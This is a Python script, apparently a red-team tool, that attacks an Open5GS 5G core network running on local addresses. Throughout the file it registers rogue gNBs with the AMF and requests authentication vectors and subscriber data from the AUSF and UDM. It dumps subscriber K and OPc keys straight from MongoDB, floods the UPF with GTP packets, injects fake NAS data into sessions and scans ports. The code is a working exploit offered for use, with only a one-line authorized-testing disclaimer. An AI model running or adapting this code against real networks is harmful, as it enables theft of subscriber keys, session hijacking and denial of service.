#!/usr/bin/env python3
"""
5G-GIBBON NUCLEAR KEY EXTRACTION
=================================
SUPER RED TEAM MODE - Every possible vector to extract encryption keys

WARNING: This is for authorized security testing only!
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.sctp import SCTP
from scapy.packet import Raw
from scapy.sendrecv import send, sr1
from scapy.contrib.gtp import GTPHeader
from scapy.layers.sctp import SCTPChunkInit
import logging
import socket
import time
import random
import threading
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

NGAP_PORT = 38412
SBI_PORT = 7777
GTP_PORT = 2152
PFCP_PORT = 8805
MONGO_PORT = 27017

OPEN5GS_IPS = {
    "AMF": "127.0.0.5",
    "SMF": "127.0.0.4",
    "UPF": "127.0.0.7",
    "NRF": "127.0.0.10",
    "AUSF": "127.0.0.11",
    "UDM": "127.0.0.12",
    "UDR": "127.0.0.20",
    "PCF": "127.0.0.13",
    "BSF": "127.0.0.15",
    "NSSF": "127.0.0.14",
}

class NuclearKeyExtraction:
    def __init__(self):
        self.results = {
            "keys_found": [],
            "responses": [],
            "errors": [],
            "successful_vectors": [],
        }
        self.captured_data = []
    
    def craft_sctp_init(self, src_port=38412, dst_port=38412):
        init_chunk = SCTPChunkInit(
            init_tag=random.randint(1, 0xFFFFFFFF),
            a_rwnd=65535,
            n_out_streams=10,
            n_in_streams=10,
            init_tsn=random.randint(1, 0xFFFFFFFF),
        )
        return init_chunk
    
    def craft_ng_setup_legitimate(self, gnb_name="ROGUE-GNB", mcc="001", mnc="01", gnb_id=None):
        if gnb_id is None:
            gnb_id = random.randint(1, 0xFFFFFF)
        
        gnb_id_bytes = gnb_id.to_bytes(3, 'big')
        mcc_mnc = bytes([0x00, 0xF1, 0x10])
        
        ng_setup = bytes([
            0x00,
            0x15,
            0x00, 0x30,
            0x00, 0x00, 0x04,
            0x00, 0x1B, 0x00, 0x09, 0x00,
            gnb_id_bytes[0], gnb_id_bytes[1], gnb_id_bytes[2], 0x00,
            mcc_mnc[0], mcc_mnc[1], mcc_mnc[2],
            0x00, 0x66, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x01,
            mcc_mnc[0], mcc_mnc[1], mcc_mnc[2],
            0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x01,
            0x00, 0x15, 0x40, 0x01, 0x60,
            0x00, 0x52, 0x40, len(gnb_name) + 1, len(gnb_name),
        ] + list(gnb_name.encode()))
        
        return ng_setup
    
    def craft_initial_context_setup_request(self, ue_id=1, security_key=None):
        if security_key is None:
            security_key = os.urandom(32)
        
        msg = bytes([
            0x00,
            0x0E,
            0x40, 0x55,
            0x00, 0x00, 0x06,
            0x00, 0x55, 0x00, 0x02, 0x00, ue_id & 0xFF,
            0x00, 0x26, 0x00, 0x24, 0x23,
            0x7E, 0x00, 0x41, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x2E, 0x20,
        ] + list(security_key) + [
            0x00, 0x6E, 0x00, 0x05, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x22, 0x40, 0x08, 0x00,
            0x00, 0xF1, 0x10, 0x00, 0x00, 0x00, 0x01,
            0x00, 0x70, 0x40, 0x01, 0x00,
        ])
        return msg, security_key
    
    def attack_vector_1_direct_sctp(self, amf_ip):
        logger.info("=" * 60)
        logger.info("[VECTOR 1] Direct SCTP to AMF")
        logger.info("=" * 60)
        
        try:
            for attempt in range(10):
                gnb_id = random.randint(1, 0xFFFFFF)
                ng_setup = self.craft_ng_setup_legitimate(f"ROGUE-{attempt}", gnb_id=gnb_id)
                
                pkt = IP(dst=amf_ip) / SCTP(sport=38412, dport=38412) / Raw(load=ng_setup)
                
                ans = sr1(pkt, timeout=2, verbose=0)
                
                if ans:
                    logger.info(f"  ✓ RESPONSE from AMF! Attempt {attempt}")
                    self.results["responses"].append({
                        "vector": "direct_sctp",
                        "response": bytes(ans).hex()[:200]
                    })
                    return True
                
                time.sleep(0.1)
            
            logger.warning("  ✗ No SCTP responses from AMF")
            return False
        except Exception as e:
            logger.error(f"  ✗ Error: {e}")
            return False
    
    def attack_vector_2_tcp_sctp_tunnel(self, amf_ip):
        logger.info("=" * 60)
        logger.info("[VECTOR 2] TCP to SCTP Port (Protocol Confusion)")
        logger.info("=" * 60)
        
        try:
            for port in [38412, 36412, 9899]:
                ng_setup = self.craft_ng_setup_legitimate("TCP-ROGUE")
                
                pkt = IP(dst=amf_ip) / TCP(sport=random.randint(40000, 60000), dport=port, flags="PA") / Raw(load=ng_setup)
                send(pkt, verbose=0)
                logger.info(f"  Sent TCP to port {port}")
            
            return True
        except Exception as e:
            logger.error(f"  ✗ Error: {e}")
            return False
    
    def attack_vector_3_sbi_nrf_extract(self):
        logger.info("=" * 60)
        logger.info("[VECTOR 3] SBI/NRF - Extract Registered NFs")
        logger.info("=" * 60)
        
        nrf_ip = OPEN5GS_IPS["NRF"]
        
        requests_to_try = [
            ("GET", "/nnrf-nfm/v1/nf-instances", "List all NFs"),
            ("GET", "/nnrf-nfm/v1/nf-instances?nf-type=AMF", "Find AMF"),
            ("GET", "/nnrf-nfm/v1/nf-instances?nf-type=AUSF", "Find AUSF"),
            ("GET", "/nnrf-disc/v1/nf-instances?target-nf-type=UDM&requester-nf-type=AMF", "Discover UDM"),
            ("GET", "/nnrf-disc/v1/nf-instances?target-nf-type=AUSF&requester-nf-type=AMF", "Discover AUSF"),
        ]
        
        for method, path, desc in requests_to_try:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((nrf_ip, SBI_PORT))
                
                http_req = f"{method} {path} HTTP/1.1\r\nHost: {nrf_ip}:{SBI_PORT}\r\nAccept: application/json\r\n\r\n"
                sock.send(http_req.encode())
                
                response = sock.recv(4096)
                sock.close()
                
                if response:
                    logger.info(f"  ✓ {desc}: {len(response)} bytes")
                    if b"200" in response or b"nfInstanceId" in response:
                        logger.info(f"    SUCCESS! Got NF data")
                        self.results["responses"].append({
                            "vector": "sbi_nrf",
                            "path": path,
                            "response": response.decode('utf-8', errors='ignore')[:500]
                        })
            except Exception as e:
                logger.debug(f"  {desc}: {e}")
        
        return len(self.results["responses"]) > 0
    
    def attack_vector_4_sbi_ausf_auth(self):
        logger.info("=" * 60)
        logger.info("[VECTOR 4] SBI/AUSF - Request Authentication Vectors")
        logger.info("=" * 60)
        
        ausf_ip = OPEN5GS_IPS["AUSF"]
        
        fake_imsis = [
            "001010000000001",
            "001010000000002",
            "001011234567890",
        ]
        
        for imsi in fake_imsis:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ausf_ip, SBI_PORT))
                
                auth_body = json.dumps({
                    "supiOrSuci": f"imsi-{imsi}",
                    "servingNetworkName": "5G:mnc001.mcc001.3gppnetwork.org",
                    "authType": "5G_AKA",
                })
                
                http_req = f"POST /nausf-auth/v1/ue-authentications HTTP/1.1\r\n"
                http_req += f"Host: {ausf_ip}:{SBI_PORT}\r\n"
                http_req += "Content-Type: application/json\r\n"
                http_req += f"Content-Length: {len(auth_body)}\r\n\r\n"
                http_req += auth_body
                
                sock.send(http_req.encode())
                response = sock.recv(4096)
                sock.close()
                
                if response and (b"authCtxId" in response or b"rand" in response or b"autn" in response):
                    logger.info(f"  ✓✓✓ GOT AUTH VECTOR for {imsi}!")
                    self.results["keys_found"].append({
                        "vector": "ausf_auth",
                        "imsi": imsi,
                        "data": response.decode('utf-8', errors='ignore')
                    })
                    self.results["successful_vectors"].append("sbi_ausf")
                elif response:
                    logger.info(f"  Response for {imsi}: {len(response)} bytes")
            except Exception as e:
                logger.debug(f"  AUSF {imsi}: {e}")
        
        return len(self.results["keys_found"]) > 0
    
    def attack_vector_5_sbi_udm_data(self):
        logger.info("=" * 60)
        logger.info("[VECTOR 5] SBI/UDM - Extract Subscriber Data")
        logger.info("=" * 60)
        
        udm_ip = OPEN5GS_IPS["UDM"]
        
        endpoints = [
            ("/nudm-sdm/v2/imsi-001010000000001/nssai", "Get NSSAI"),
            ("/nudm-sdm/v2/imsi-001010000000001/am-data", "Get AM Data"),
            ("/nudm-sdm/v2/imsi-001010000000001/smf-select-data", "Get SMF Data"),
            ("/nudm-uecm/v1/imsi-001010000000001/registrations/amf-3gpp-access", "Get Registration"),
            ("/nudm-ueau/v1/imsi-001010000000001/security-information/generate-auth-data", "Generate Auth"),
        ]
        
        for path, desc in endpoints:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((udm_ip, SBI_PORT))
                
                http_req = f"GET {path} HTTP/1.1\r\nHost: {udm_ip}:{SBI_PORT}\r\nAccept: application/json\r\n\r\n"
                sock.send(http_req.encode())
                
                response = sock.recv(4096)
                sock.close()
                
                if response and b"200" in response:
                    logger.info(f"  ✓ {desc}: SUCCESS!")
                    self.results["responses"].append({
                        "vector": "udm_sdm",
                        "path": path,
                        "response": response.decode('utf-8', errors='ignore')[:500]
                    })
            except Exception as e:
                logger.debug(f"  {desc}: {e}")
    
    def attack_vector_6_mongodb_direct(self):
        logger.info("=" * 60)
        logger.info("[VECTOR 6] MongoDB Direct Access (Database Dump)")
        logger.info("=" * 60)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect(("127.0.0.1", MONGO_PORT))
            
            ismaster_cmd = bytes([
                0x3F, 0x00, 0x00, 0x00,
                0x01, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0xD4, 0x07, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x61, 0x64, 0x6D, 0x69, 0x6E, 0x2E, 0x24, 0x63, 0x6D, 0x64, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x01, 0x00, 0x00, 0x00,
                0x15, 0x00, 0x00, 0x00,
                0x10, 0x69, 0x73, 0x4D, 0x61, 0x73, 0x74, 0x65, 0x72, 0x00,
                0x01, 0x00, 0x00, 0x00, 0x00,
            ])
            
            sock.send(ismaster_cmd)
            response = sock.recv(4096)
            sock.close()
            
            if response:
                logger.info(f"  ✓✓✓ MONGODB ACCESSIBLE! {len(response)} bytes")
                self.results["successful_vectors"].append("mongodb")
                
                try:
                    import pymongo
                    client = pymongo.MongoClient("mongodb://127.0.0.1:27017/", serverSelectionTimeoutMS=2000)
                    
                    db = client["open5gs"]
                    
                    subscribers = list(db.subscribers.find({}, {"_id": 0}))
                    if subscribers:
                        logger.info(f"  ✓✓✓ EXTRACTED {len(subscribers)} SUBSCRIBER RECORDS!")
                        for sub in subscribers[:3]:
                            logger.info(f"    IMSI: {sub.get('imsi', 'N/A')}")
                            if 'security' in sub:
                                logger.info(f"    K: {sub['security'].get('k', 'N/A')}")
                                logger.info(f"    OPc: {sub['security'].get('opc', 'N/A')}")
                                self.results["keys_found"].append(sub)
                    
                    client.close()
                except ImportError:
                    logger.warning("  pymongo not installed - raw access only")
                except Exception as e:
                    logger.debug(f"  MongoDB query error: {e}")
                
                return True
        except Exception as e:
            logger.info(f"  ✗ MongoDB not accessible: {e}")
        
        return False
    
    def attack_vector_7_gtp_massive_flood(self, upf_ip, amf_ip, count=500):
        logger.info("=" * 60)
        logger.info(f"[VECTOR 7] Massive GTP Flood ({count} packets)")
        logger.info("=" * 60)
        
        def send_attack(i):
            try:
                ng_setup = self.craft_ng_setup_legitimate(f"FLOOD-{i}", gnb_id=random.randint(1, 0xFFFFFF))
                
                inner = IP(src="10.0.0.8", dst=amf_ip) / UDP(sport=38412, dport=38412) / Raw(load=ng_setup)
                outer = IP(src="10.0.0.8", dst=upf_ip) / UDP(sport=2152, dport=2152)
                outer = outer / GTPHeader(teid=random.randint(1, 65535), gtp_type=255) / Raw(load=bytes(inner))
                
                send(outer, verbose=0)
                return True
            except:
                return False
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(send_attack, i) for i in range(count)]
            success = sum(1 for f in as_completed(futures) if f.result())
        
        logger.info(f"  ✓ Sent {success}/{count} flood packets")
        return True
    
    def attack_vector_8_race_condition(self, amf_ip, upf_ip):
        logger.info("=" * 60)
        logger.info("[VECTOR 8] Race Condition Attack")
        logger.info("=" * 60)
        
        def rapid_fire():
            for _ in range(100):
                ng_setup = self.craft_ng_setup_legitimate("RACE", gnb_id=0x123456)
                pkt = IP(dst=amf_ip) / SCTP(sport=38412, dport=38412) / Raw(load=ng_setup)
                send(pkt, verbose=0)
        
        threads = [threading.Thread(target=rapid_fire) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        logger.info("  ✓ Race condition attack complete (1000 simultaneous requests)")
        return True
    
    def attack_vector_9_session_hijack(self, upf_ip):
        logger.info("=" * 60)
        logger.info("[VECTOR 9] Session Hijack via TEID Injection")
        logger.info("=" * 60)
        
        for teid in range(1, 100):
            fake_data = b'\x7E\x00\x5E' + os.urandom(50)
            
            pkt = IP(dst=upf_ip) / UDP(sport=2152, dport=2152)
            pkt = pkt / GTPHeader(teid=teid, gtp_type=255) / Raw(load=fake_data)
            send(pkt, verbose=0)
        
        logger.info("  ✓ Injected fake NAS data into 100 sessions")
        return True
    
    def attack_vector_10_all_ports_scan(self, target_ip):
        logger.info("=" * 60)
        logger.info(f"[VECTOR 10] All Ports Probe on {target_ip}")
        logger.info("=" * 60)
        
        ports = [7777, 8805, 38412, 36412, 27017, 3000, 9090, 2152, 80, 443, 8080]
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                
                if result == 0:
                    logger.info(f"  ✓ Port {port} OPEN on {target_ip}")
                    self.results["responses"].append({
                        "vector": "port_scan",
                        "ip": target_ip,
                        "port": port
                    })
            except:
                pass
        
        return True
    
    def run_nuclear_extraction(self):
        logger.info("")
        logger.info("█" * 60)
        logger.info("█  5G-GIBBON NUCLEAR KEY EXTRACTION")
        logger.info("█  SUPER RED TEAM MODE")
        logger.info("█" * 60)
        logger.info("")
        
        amf_ip = OPEN5GS_IPS["AMF"]
        upf_ip = OPEN5GS_IPS["UPF"]
        
        self.attack_vector_1_direct_sctp(amf_ip)
        time.sleep(0.5)
        
        self.attack_vector_2_tcp_sctp_tunnel(amf_ip)
        time.sleep(0.5)
        
        self.attack_vector_3_sbi_nrf_extract()
        time.sleep(0.5)
        
        self.attack_vector_4_sbi_ausf_auth()
        time.sleep(0.5)
        
        self.attack_vector_5_sbi_udm_data()
        time.sleep(0.5)
        
        self.attack_vector_6_mongodb_direct()
        time.sleep(0.5)
        
        self.attack_vector_7_gtp_massive_flood(upf_ip, amf_ip, count=500)
        time.sleep(0.5)
        
        self.attack_vector_8_race_condition(amf_ip, upf_ip)
        time.sleep(0.5)
        
        self.attack_vector_9_session_hijack(upf_ip)
        time.sleep(0.5)
        
        for ip in [amf_ip, OPEN5GS_IPS["NRF"], OPEN5GS_IPS["AUSF"], OPEN5GS_IPS["UDM"]]:
            self.attack_vector_10_all_ports_scan(ip)
        
        logger.info("")
        logger.info("█" * 60)
        logger.info("█  NUCLEAR EXTRACTION COMPLETE")
        logger.info("█" * 60)
        logger.info("")
        
        if self.results["keys_found"]:
            logger.info("🔑🔑🔑 KEYS EXTRACTED! 🔑🔑🔑")
            for key in self.results["keys_found"]:
                logger.info(f"  {key}")
        else:
            logger.info("No keys extracted - network is secure against these vectors")
        
        logger.info(f"\nSuccessful vectors: {self.results['successful_vectors']}")
        logger.info(f"Total responses captured: {len(self.results['responses'])}")
        
        return self.results

def main():
    nuclear = NuclearKeyExtraction()
    results = nuclear.run_nuclear_extraction()
    
    with open("nuclear_extraction_results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)
    
    logger.info("\nResults saved to: nuclear_extraction_results.json")

if __name__ == "__main__":
    main()

